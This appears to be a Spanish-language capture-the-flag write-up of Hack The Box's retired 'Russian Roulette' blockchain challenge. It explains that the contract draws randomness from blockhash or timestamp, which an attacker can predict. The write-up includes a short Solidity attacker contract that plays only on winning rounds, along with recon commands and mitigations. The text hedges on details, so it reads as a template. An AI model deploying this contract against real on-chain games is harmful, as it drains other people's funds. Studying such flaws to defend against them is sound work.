---
challenge: Russian Roulette
type: Blockchain
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [blockchain, solidity, blockhash, randomness, foundry]
---

# Russian Roulette — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

El contrato usa `blockhash` o `block.timestamp` como fuente de aleatoriedad para decidir si el jugador gana. Esos valores son predecibles desde otro contrato, por lo que se calcula la condición y se apuesta solo cuando la ronda va a ganar.

## Enunciado y superficie

- Blockchain, Very Easy, retirado.
- Se entrega una instancia de contrato y un RPC.
- El objetivo es vaciar el contrato o alcanzar una condición.

```bash
cast block-number --rpc-url <RPC>
cast call <CONTRACT> "balance()(uint256)" --rpc-url <RPC>
```

## Reconocimiento

- Revisar el código de `Roulette.sol`.
- Identificar la función `play` o `spin`.
- Ver si usa `blockhash`, `block.prevrandao`, `block.timestamp` o un número pequeño.
- Revisar el saldo y las reglas de victoria.

## Análisis del código

La condición depende del hash del bloque anterior. Un contrato atacante puede consultar el mismo `blockhash` dentro de la misma transacción y decidir si llama a `play` o revierte. No hay secreto: la aleatoriedad es pública y determinista.

## Explicación del fallo

Usar datos de la cadena como aleatoriedad permite que el atacante calcule el resultado antes de apostar. La única defensa sería un oráculo verificable o un compromiso previo.

## Reproducción local

```bash
anvil
forge test --fork-url <RPC>
```

## Explotación

```solidity
contract Attack {
    function spin(address target) external {
        uint256 n = uint256(blockhash(block.number - 1)) % 2;
        if (n == 1) target.call(abi.encodeWithSignature("play()"));
    }
}
```

Se despliega el atacante, se financia y se ejecuta hasta vaciar el contrato. La flag se obtiene del reto, no del saldo.

## Evidencia

- Código con `blockhash`/`timestamp`.
- Cálculo local del resultado.
- Transacción de `play` exitosa.
- Flag redactada.

## Lecciones aprendidas

- La cadena no es una fuente de aleatoriedad.
- Un contrato atacante puede simular la misma ronda.
- `blockhash` es visible antes de la transacción.

## Mitigaciones y detección

- Usar Chainlink VRF o un commit-reveal.
- No basar pagos en `blockhash` ni `timestamp`.
- Auditar contratos con lógica de azar.
- Referencias: Solidity docs, Chainlink VRF, HTB Russian Roulette.

## Referencias

- <https://www.hackthebox.com/challenges/Russian%20Roulette>
- <https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties>
- <https://docs.chain.link/vrf>
- <https://attack.mitre.org/techniques/T1565/>
